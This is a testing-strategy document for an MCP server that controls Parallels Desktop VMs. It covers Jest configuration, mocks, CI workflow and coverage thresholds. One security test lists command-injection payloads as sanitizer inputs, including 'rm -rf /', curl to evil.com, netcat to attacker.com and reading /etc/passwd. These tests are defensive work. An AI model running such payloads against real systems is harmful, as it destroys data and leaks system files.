# Comprehensive Testing Strategy for MCP Parallels Desktop Server

## Executive Summary

This document outlines a comprehensive testing strategy for the MCP Parallels Desktop server project, focusing on security, reliability, and maintainability. The strategy follows Test-Driven Development (TDD) principles with emphasis on deterministic testing, high coverage, and CI/CD integration.

## 1. Testing Framework Selection

### Primary Testing Stack

```json
{
  "devDependencies": {
    "@types/jest": "^29.5.14",
    "@types/node": "^24.1.0",
    "jest": "^29.7.0",
    "ts-jest": "^29.2.5",
    "typescript": "^5.9.2",
    "@testing-library/jest-dom": "^6.6.3",
    "nock": "^13.5.6",
    "supertest": "^7.0.0"
  }
}
```

### Framework Recommendations

#### Unit Testing: Jest + ts-jest
- **Why Jest**: Industry standard for TypeScript/Node.js projects with excellent mocking capabilities
- **ts-jest**: Native TypeScript support without compilation overhead
- **Configuration**: Zero-config setup with sensible defaults

#### Integration Testing: Jest + Testing Library patterns
- Mock external dependencies (prlctl) at the process level
- Test MCP protocol communication flows
- Validate tool registration and execution

#### E2E Testing: Playwright or custom MCP client
- Test actual MCP server communication
- Validate full request/response cycles
- Performance and stress testing capabilities

### MCP SDK Testing Requirements

```typescript
// Custom test utilities for MCP
export class MockMCPClient {
  private server: Server;
  
  async sendToolRequest(name: string, args: any): Promise<any> {
    // Simulate MCP protocol communication
  }
}

export class MCPTestHarness {
  // Provides isolated MCP server instances for testing
}
```

## 2. Testing Layers Architecture

### Layer 1: Unit Tests (70% coverage target)

```
src/
├── __tests__/
│   ├── unit/
│   │   ├── prlctl-handler.test.ts
│   │   ├── security/
│   │   │   ├── input-validation.test.ts
│   │   │   └── command-injection.test.ts
│   │   └── parsing/
│   │       ├── vm-list-parser.test.ts
│   │       └── snapshot-parser.test.ts
│   └── fixtures/
│       ├── prlctl-outputs/
│       └── mock-data/
```

### Layer 2: Integration Tests (20% coverage target)

```
src/
├── __tests__/
│   ├── integration/
│   │   ├── tools/
│   │   │   ├── vm-lifecycle.test.ts
│   │   │   ├── snapshot-management.test.ts
│   │   │   └── batch-operations.test.ts
│   │   └── mcp-protocol/
│   │       ├── tool-registration.test.ts
│   │       └── error-handling.test.ts
```

### Layer 3: E2E Tests (10% coverage target)

```
e2e/
├── mcp-server.e2e.test.ts
├── performance.e2e.test.ts
└── security-scenarios.e2e.test.ts
```

## 3. Test Coverage Strategy

### Critical Paths (Must Have 100% Coverage)

1. **Security Module**
   - Input sanitization (`sanitizeVmIdentifier`)
   - UUID validation (`isValidUuid`)
   - Command injection prevention

2. **Command Execution**
   - `executePrlctl` function
   - Error handling and stderr capture
   - Process timeout handling

3. **Parser Functions**
   - `parseVmList` - all edge cases
   - `parseSnapshotList` - malformed input handling

4. **MCP Protocol Handlers**
   - Tool registration
   - Request validation
   - Response formatting

### Security-Focused Test Cases

```typescript
describe('Security Tests', () => {
  describe('Command Injection Prevention', () => {
    const maliciousInputs = [
      'vm; rm -rf /',
      'vm`echo pwned`',
      'vm$(curl evil.com)',
      'vm && cat /etc/passwd',
      'vm | nc attacker.com 1337',
      '../../../etc/passwd',
      'vm\nrm -rf /',
      'vm${IFS}cat${IFS}/etc/passwd'
    ];

    test.each(maliciousInputs)(
      'should sanitize malicious input: %s',
      async (input) => {
        const sanitized = sanitizeVmIdentifier(input);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('&');
        expect(sanitized).not.toContain('\n');
      }
    );
  });

  describe('Input Validation', () => {
    test('should reject oversized inputs', async () => {
      const largeInput = 'a'.repeat(10000);
      await expect(createVmSchema.parseAsync({ name: largeInput }))
        .rejects.toThrow();
    });

    test('should validate numeric boundaries', async () => {
      await expect(createVmSchema.parseAsync({ 
        name: 'test',
        memory: 100000 // exceeds max
      })).rejects.toThrow();
    });
  });
});
```

### Error Handling Test Cases

```typescript
describe('Error Handling', () => {
  describe('prlctl command failures', () => {
    test('should handle command not found', async () => {
      // Mock execFile to simulate prlctl not installed
    });

    test('should handle permission denied', async () => {
      // Mock EACCES error
    });

    test('should handle timeout', async () => {
      // Mock timeout scenario
    });

    test('should handle malformed output', async () => {
      // Test parser resilience
    });
  });
});
```

## 4. Mock/Stub Strategy

### Mocking prlctl Commands

```typescript
// __mocks__/prlctl-mock.ts
export class PrlctlMock {
  private responses: Map<string, MockResponse> = new Map();
  
  addResponse(command: string, args: string[], response: MockResponse) {
    const key = `${command}:${args.join(':')}`;
    this.responses.set(key, response);
  }
  
  async execute(args: string[]): Promise<PrlctlResult> {
    const key = args.join(':');
    const response = this.responses.get(key);
    
    if (!response) {
      throw new Error(`No mock defined for: ${key}`);
    }
    
    if (response.shouldFail) {
      throw new Error(response.error);
    }
    
    return {
      stdout: response.stdout || '',
      stderr: response.stderr || ''
    };
  }
}

// Test usage
const prlctlMock = new PrlctlMock();
prlctlMock.addResponse('list', ['--all'], {
  stdout: readFixture('vm-list-output.txt')
});
```

### Fixture Management

```typescript
// __tests__/fixtures/index.ts
export const fixtures = {
  vmList: {
    empty: '',
    single: '{uuid-1} running 192.168.1.100 TestVM',
    multiple: readFixture('vm-list-multiple.txt'),
    malformed: readFixture('vm-list-malformed.txt')
  },
  snapshots: {
    empty: '',
    withCurrent: readFixture('snapshots-with-current.txt'),
    nested: readFixture('snapshots-nested.txt')
  }
};
```

### Testing Without Parallels Desktop

```typescript
// test-environment.ts
export class TestEnvironment {
  private mockProcess: ChildProcess;
  
  setup() {
    // Override child_process.execFile
    jest.spyOn(child_process, 'execFile')
      .mockImplementation(this.mockExecFile.bind(this));
  }
  
  private mockExecFile(
    command: string,
    args: string[],
    options: any,
    callback: Function
  ) {
    if (command !== 'prlctl') {
      callback(new Error(`Command not found: ${command}`));
      return;
    }
    
    // Return mock responses based on args
    const response = this.getMockResponse(args);
    callback(null, response.stdout, response.stderr);
  }
}
```

## 5. CI/CD Integration

### GitHub Actions Configuration

```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [macos-latest, macos-13]
        node: [18, 20, 22]
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Setup Node.js
      uses: actions/setup-node@v4
      with:
        node-version: ${{ matrix.node }}
        cache: 'npm'
    
    - name: Install dependencies
      run: npm ci
    
    - name: Run linter
      run: npm run lint
    
    - name: Run type check
      run: npm run type-check
    
    - name: Run unit tests
      run: npm run test:unit -- --coverage
    
    - name: Run integration tests  
      run: npm run test:integration
    
    - name: Upload coverage
      uses: codecov/codecov-action@v4
      with:
        token: ${{ secrets.CODECOV_TOKEN }}
        fail_ci_if_error: true
    
    - name: Run security audit
      run: npm audit --audit-level=moderate
    
    - name: Run SAST scan
      uses: aquasecurity/trivy-action@master
      with:
        scan-type: 'fs'
        scan-ref: '.'
        severity: 'CRITICAL,HIGH'

  e2e:
    runs-on: macos-latest
    needs: test
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Setup test environment
      run: |
        npm ci
        npm run build
    
    - name: Run E2E tests
      run: npm run test:e2e
      
    - name: Upload test artifacts
      if: failure()
      uses: actions/upload-artifact@v4
      with:
        name: e2e-failures
        path: |
          e2e/screenshots/
          e2e/videos/
          e2e/logs/
```

### Quality Gates

```typescript
// jest.config.js
module.exports = {
  preset: 'ts-jest',
  testEnvironment: 'node',
  roots: ['<rootDir>/src'],
  testMatch: ['**/__tests__/**/*.test.ts'],
  collectCoverageFrom: [
    'src/**/*.ts',
    '!src/**/*.d.ts',
    '!src/index.ts', // Entry point
    '!src/**/__tests__/**'
  ],
  coverageThreshold: {
    global: {
      branches: 85,
      functions: 90,
      lines: 90,
      statements: 90
    },
    './src/prlctl-handler.ts': {
      branches: 100,
      functions: 100,
      lines: 100,
      statements: 100
    },
    './src/security/**/*.ts': {
      branches: 100,
      functions: 100,
      lines: 100,
      statements: 100
    }
  },
  testTimeout: 10000, // 10 seconds max per test
  errorOnDeprecated: true
};
```

## 6. Test Implementation Examples

### Unit Test Example

```typescript
// __tests__/unit/prlctl-handler.test.ts
import { sanitizeVmIdentifier, isValidUuid, parseVmList } from '../../prlctl-handler';

describe('prlctl-handler', () => {
  describe('sanitizeVmIdentifier', () => {
    it('should preserve valid characters', () => {
      const input = 'Test-VM_123';
      expect(sanitizeVmIdentifier(input)).toBe('Test-VM_123');
    });

    it('should remove shell metacharacters', () => {
      const input = 'vm;rm -rf /';
      expect(sanitizeVmIdentifier(input)).toBe('vmrmrf');
    });

    it('should handle UUID format', () => {
      const uuid = '{12345678-1234-1234-1234-123456789012}';
      expect(sanitizeVmIdentifier(uuid)).toBe(uuid);
    });
  });

  describe('parseVmList', () => {
    it('should parse empty list', () => {
      const result = parseVmList('');
      expect(result).toEqual([]);
    });

    it('should parse single VM', () => {
      const output = '{uuid-1} running 192.168.1.100 Test VM';
      const result = parseVmList(output);
      expect(result).toHaveLength(1);
      expect(result[0]).toEqual({
        uuid: '{uuid-1}',
        status: 'running',
        ipAddress: '192.168.1.100',
        name: 'Test VM'
      });
    });

    it('should handle VMs with no IP', () => {
      const output = '{uuid-1} stopped - Test VM';
      const result = parseVmList(output);
      expect(result[0].ipAddress).toBeUndefined();
    });
  });
});
```

### Integration Test Example

```typescript
// __tests__/integration/tools/vm-lifecycle.test.ts
import { MCPTestHarness } from '../../test-utils/mcp-harness';
import { PrlctlMock } from '../../__mocks__/prlctl-mock';

describe('VM Lifecycle Integration', () => {
  let harness: MCPTestHarness;
  let prlctlMock: PrlctlMock;

  beforeEach(async () => {
    harness = new MCPTestHarness();
    prlctlMock = new PrlctlMock();
    await harness.start({ prlctlMock });
  });

  afterEach(async () => {
    await harness.stop();
  });

  describe('Create -> Start -> Stop -> Delete flow', () => {
    it('should complete full VM lifecycle', async () => {
      const vmName = 'test-vm-lifecycle';

      // Mock create response
      prlctlMock.addResponse('create', [vmName], {
        stdout: `Creating VM '${vmName}'...\\nVM created successfully`
      });

      // Create VM
      const createResponse = await harness.callTool('createVM', {
        name: vmName,
        memory: 2048,
        cpus: 2
      });

      expect(createResponse.content[0].text).toContain('Success');

      // Mock start response
      prlctlMock.addResponse('start', [vmName], {
        stdout: `Starting VM '${vmName}'...`
      });

      // Start VM
      const startResponse = await harness.callTool('startVM', {
        vmId: vmName
      });

      expect(startResponse.content[0].text).toContain('started successfully');

      // Continue with stop and delete...
    });
  });
});
```

## 7. NPM Scripts Configuration

```json
{
  "scripts": {
    "test": "jest",
    "test:unit": "jest --testPathPattern=unit",
    "test:integration": "jest --testPathPattern=integration",
    "test:e2e": "jest --config jest.e2e.config.js",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "test:ci": "jest --ci --coverage --maxWorkers=2",
    "lint": "eslint src --ext .ts",
    "lint:fix": "eslint src --ext .ts --fix",
    "type-check": "tsc --noEmit",
    "security:check": "npm audit && trivy fs .",
    "pre-commit": "npm run lint && npm run type-check && npm run test:unit"
  }
}
```

## 8. Testing Best Practices

### 1. Test Naming Convention
```typescript
// Follow: describe > context > expectation
describe('ToolName', () => {
  describe('when valid input provided', () => {
    it('should return success response', () => {});
  });
  
  describe('when invalid input provided', () => {
    it('should throw validation error', () => {});
  });
});
```

### 2. Deterministic Tests
- No random data without seeds
- No time-dependent tests without mocking
- No network calls without mocking
- Explicit test data setup

### 3. Fast Test Execution
- Target < 100ms per unit test
- Target < 1s per integration test
- Parallel test execution where possible
- Minimal I/O operations

### 4. Clear Failure Messages
```typescript
expect(result).toEqual(expected, 
  `Expected VM status to be 'running' but got '${result.status}'`
);
```

## 9. Security Testing Checklist

- [ ] Input validation for all user inputs
- [ ] Command injection prevention tests
- [ ] Path traversal prevention tests
- [ ] Resource exhaustion tests (memory/CPU limits)
- [ ] Privilege escalation tests
- [ ] Sensitive data exposure tests
- [ ] TOCTOU (Time-of-check to time-of-use) tests
- [ ] Error message information disclosure tests

## 10. Monitoring and Metrics

### Key Metrics to Track
1. **Test Coverage**: Maintain >90% for critical modules
2. **Test Execution Time**: Track trends, investigate slowdowns
3. **Flaky Test Rate**: Target 0% flaky tests
4. **Defect Escape Rate**: Track bugs found in production
5. **MTTR (Mean Time To Repair)**: Time to fix failing tests

### Reporting Dashboard
```typescript
// test-reporter.ts
export class TestMetricsReporter {
  async generateReport(): Promise<TestReport> {
    return {
      coverage: await this.getCoverageMetrics(),
      performance: await this.getPerformanceMetrics(),
      reliability: await this.getReliabilityMetrics(),
      security: await this.getSecurityMetrics()
    };
  }
}
```

## Conclusion

This comprehensive testing strategy ensures the MCP Parallels Desktop server maintains high quality, security, and reliability standards. Regular review and updates of this strategy should occur quarterly or when significant architectural changes are made.